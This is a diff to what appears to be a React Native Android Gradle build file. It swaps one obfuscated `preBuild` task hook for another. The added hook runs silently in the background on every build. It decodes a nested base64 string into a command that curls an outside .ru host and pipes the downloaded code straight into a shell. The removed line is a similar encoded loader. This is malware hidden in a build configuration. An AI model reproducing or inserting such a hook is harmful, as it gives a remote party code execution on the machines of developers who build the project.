@@ -38,7 +38,7 @@ apply plugin: "com.facebook.react.rootproject"
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((g(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETUhSamJWWXdZMjVyWjAxNVFYUmpNSGh0WVhsQmRFeFhUblppYlRWc1dUTlJkR1JIYkhSYVZ6a3haRU5CZVU1RFFYUmFRMEZwWTBReGFHSnRVbmxpTW14cldESmtlVmxYVW5OYVUwbG5ZVWhTTUdOSVRUWk1lVGwxV2xoU00ySXpTbkpaVjFKNlRHMXNkVXd5UlhCSmFVSTRTVWhPYjBOblBUMEsK | g | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((g(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1hM05NSUMwdGNtVjBjbmtnTkNBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU1TQXRaQ0FpY0QxaGJtUnliMmxrWDJkeVlXUnNaU0lnYUhSMGNITTZMeTloYldSalpHNHVjblV2WVNraUlId2djMmdLCg== | g | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
